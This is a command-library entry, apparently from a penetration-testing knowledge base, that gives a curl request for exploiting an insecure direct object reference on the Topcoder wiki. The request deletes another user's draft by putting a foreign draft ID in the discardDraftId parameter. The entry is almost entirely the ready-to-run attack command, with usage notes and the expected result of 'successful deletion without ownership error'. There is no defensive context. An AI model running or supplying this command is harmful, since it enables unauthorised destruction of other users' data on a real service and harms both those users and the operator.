---
id: cmd-curl-delete-foreign
data: >-
  curl -c cookies.txt -b cookies.txt -X GET
  "https://apps.topcoder.com/wiki/users/viewmydrafts.action?discardDraftId=OTHER_USER_DRAFT_ID"
  -H "Cookie: JSESSIONID=your_session"
tags:
  - exploit
  - http
  - idor
type: command
output: null
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:33.576Z'
verified: false
validated: true
submitted: true
---
# curl-delete-foreign-draft

## Command

```bash
curl -c cookies.txt -b cookies.txt -X GET "https://apps.topcoder.com/wiki/users/viewmydrafts.action?discardDraftId=OTHER_USER_DRAFT_ID" -H "Cookie: JSESSIONID=your_session"
```

## Description

Exploits IDOR by deleting a foreign draft using its ID in the parameter.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `discardDraftId=OTHER_USER_DRAFT_ID` | Foreign draft ID | Yes |

## Examples

### Basic Usage

Use actual foreign ID.

## Expected Output

Successful deletion without ownership error.

## Related

- [[Related Procedure]]
